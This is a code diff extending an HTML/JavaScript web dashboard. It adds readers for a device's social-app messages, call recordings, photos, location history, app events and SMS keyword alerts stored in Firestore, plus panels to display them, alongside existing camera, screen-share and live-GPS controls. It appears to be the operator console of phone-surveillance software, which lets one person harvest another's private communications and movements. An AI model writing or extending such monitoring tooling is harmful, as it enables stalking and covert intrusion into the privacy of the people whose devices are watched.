+        const d = new Date(typeof ts === 'number' && ts < 9999999999 ? ts * 1000 : ts);
+        if (dateOnly) return d.getDate()+'/'+(d.getMonth()+1)+'/'+d.getFullYear().toString().slice(-2);
+        return ('0'+d.getDate()).slice(-2)+'/'+ ('0'+(d.getMonth()+1)).slice(-2)+' '+('0'+d.getHours()).slice(-2)+':'+('0'+d.getMinutes()).slice(-2);
+    }
+
+    // Firestore reader stubs — only active when Firebase is configured
+    function loadSocialFromFirebase(days, cb) {
+        _fbRead('social_messages', days, cb);
+    }
+    function loadCallRecordingsFromFirebase(days, cb) {
+        _fbRead('call_recordings', days, cb);
+    }
+    function loadImagesFromFirebase(days, cb) {
+        _fbRead('images_meta', days, cb);
+    }
+    function loadLocationHistoryFromFirebase(days, cb) {
+        _fbRead('location_history', days, cb);
+    }
+    function loadAppEventsFromFirebase(days, cb) {
+        _fbRead('app_events', days, cb);
+    }
+    function loadSmsAlertsFromFirebase(days, cb) {
+        _fbRead('sms_alerts', days, cb);
+    }
+
+    function _fbRead(col, days, cb) {
+        try {
+            if (typeof firebase === 'undefined' || !window.firestoreDb) { cb(null, 'Firebase not init'); return; }
+            const devId = typeof currentDeviceId !== 'undefined' ? currentDeviceId : null;
+            if (!devId) { cb(null, 'No device'); return; }
+            const cutoff = Date.now() - (days * 86400000);
+            window.firestoreDb.collection('devices').doc(devId).collection(col)
+                .where('timestamp', '>', cutoff).orderBy('timestamp', 'desc').limit(300).get()
+                .then(function(snap) {
+                    const items = snap.docs.map(function(doc) {
+                        const d = doc.data();
+                        d.timeFmt = formatTimestamp(d.timestamp);
+                        return d;
+                    });
+                    cb(items, null);
+                })
+                .catch(function(e) { cb(null, e.message); });
+        } catch(e) { cb(null, e.message); }
+    }
+
+    function startSocialMessagesLiveListener() {}  // activated by Firebase block below
+    function startLocationLiveListener() {}
+
+    function showFirebaseSettingsPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '🔥 Firebase Configuration';
+        panel.appendChild(h3);
+        const desc = document.createElement('p');
+        desc.style.cssText = 'color:#666;font-size:13px;margin-bottom:16px;line-height:1.6';
+        desc.innerHTML = 'Enter your Firebase project config. Get it from <a href="https://console.firebase.google.com" target="_blank" style="color:#1976ff">Firebase Console</a> → Project Settings → Web App.';
+        panel.appendChild(desc);
+        const fbConf = (typeof firebaseConfig !== 'undefined') ? firebaseConfig : {};
+        const fields = [
+            ['apiKey','API Key'],['authDomain','Auth Domain'],['projectId','Project ID'],
+            ['storageBucket','Storage Bucket'],['messagingSenderId','Sender ID'],['appId','App ID']
+        ];
+        const form = document.createElement('div');
+        form.style.cssText = 'display:flex;flex-direction:column;gap:10px;max-width:480px';
+        fields.forEach(function(f) {
+            const wrap = document.createElement('div');
+            const lbl = document.createElement('label');
+            lbl.style.cssText = 'font-size:12px;color:#999;display:block;margin-bottom:3px';
+            lbl.textContent = f[1];
+            const inp = document.createElement('input'); inp.id = 'fb_'+f[0]; inp.type = 'text';
+            inp.value = (fbConf[f[0]] && fbConf[f[0]] !== 'YOUR_API_KEY') ? fbConf[f[0]] : '';
+            inp.placeholder = f[1];
+            inp.style.cssText = 'width:100%;padding:8px 10px;border:1px solid #ddd;border-radius:6px;font-size:13px;box-sizing:border-box';
+            wrap.appendChild(lbl); wrap.appendChild(inp); form.appendChild(wrap);
+        });
+        const saveBtn = document.createElement('button'); saveBtn.textContent = '💾 Save & Connect';
+        saveBtn.style.cssText = 'padding:10px 20px;background:#ff6f00;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;margin-top:6px';
+        saveBtn.addEventListener('click', function() {
+            const newCfg = {};
+            fields.forEach(function(f) { newCfg[f[0]] = document.getElementById('fb_'+f[0]).value.trim(); });
+            if (!newCfg.projectId) { alert('Enter at least Project ID'); return; }
+            localStorage.setItem('fbConfig', JSON.stringify(newCfg));
+            alert('Saved! Reload page to apply Firebase config.');
+        });
+        panel.appendChild(form); panel.appendChild(saveBtn);
+        const connected = fbConf.apiKey && fbConf.apiKey !== 'YOUR_API_KEY';
+        const status = document.createElement('div');
+        status.style.cssText = 'margin-top:16px;padding:12px;background:#f5f5f5;border-radius:8px;font-size:12px';
+        status.innerHTML = connected
+            ? '<span style="color:#4caf50;font-weight:700">● Firebase Connected</span> — ' + (fbConf.projectId || '')
+            : '<span style="color:#d32f2f;font-weight:700">● Not configured</span> — Enter credentials above';
+        panel.appendChild(status);
+    }
+
     // ---------- ATTACH FUNCTIONS TO WINDOW ----------
     window.toggleScreen = toggleScreen;
     window.toggleCameraPanel = toggleCameraPanel;
@@ -2274,11 +2967,53 @@ window.addEventListener('load', () => {
     window.startScheduledCapture = startScheduledCapture;
     window.clearAlerts = clearAlerts;
     window.toggleLiveGps = toggleLiveGps;
+    window.showSocialMessagesPanel  = showSocialMessagesPanel;
+    window.filterSocialByPkg        = filterSocialByPkg;
+    window.showCallRecordingsPanel  = showCallRecordingsPanel;
+    window.showPhotoGalleryPanel    = showPhotoGalleryPanel;
+    window.showLocationHistoryPanel = showLocationHistoryPanel;
+    window.showAppEventsPanel       = showAppEventsPanel;
+    window.showSmsKeywordsPanel     = showSmsKeywordsPanel;
+    window.showFirebaseSettingsPanel = showFirebaseSettingsPanel;
 
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
 
     // ---------- START ----------
     connectWebSocket();   // initial connection
+</script>
+
+<!-- Firebase config + Firestore initialisation (separate non-module script) -->
+<script>
+// ── Replace these values with your Firebase project config ────────────────
+// Firebase Console → Project Settings → Your Apps → Web App → SDK Config
+var firebaseConfig = {
+    apiKey:            "YOUR_API_KEY",
+    authDomain:        "YOUR_PROJECT.firebaseapp.com",
+    projectId:         "YOUR_PROJECT_ID",
+    storageBucket:     "YOUR_PROJECT.appspot.com",
+    messagingSenderId: "YOUR_SENDER_ID",
+    appId:             "YOUR_APP_ID"
+};
+
+// Load saved config from localStorage (set via 🔥 Firebase Setup panel)
+try {
+    var _saved = localStorage.getItem('fbConfig');
+    if (_saved) Object.assign(firebaseConfig, JSON.parse(_saved));
+} catch(e) {}
+
+// Initialise only if real credentials are provided
+if (firebaseConfig.apiKey && firebaseConfig.apiKey !== 'YOUR_API_KEY') {
+    firebase.initializeApp(firebaseConfig);
+    window.firestoreDb = firebase.firestore();
+    window.firestoreDb.enablePersistence()
+        .catch(function(e) { console.warn('Firestore persistence:', e.code); });
+    firebase.auth().signInAnonymously()
+        .then(function() { console.log('Firebase auth OK'); })
+        .catch(function(e) { console.warn('Firebase auth:', e.message); });
+    console.log('Firebase initialised:', firebaseConfig.projectId);
+} else {
+    console.log('Firebase not configured — using WebSocket only');
+}
 </script>
 </body>
 </html>
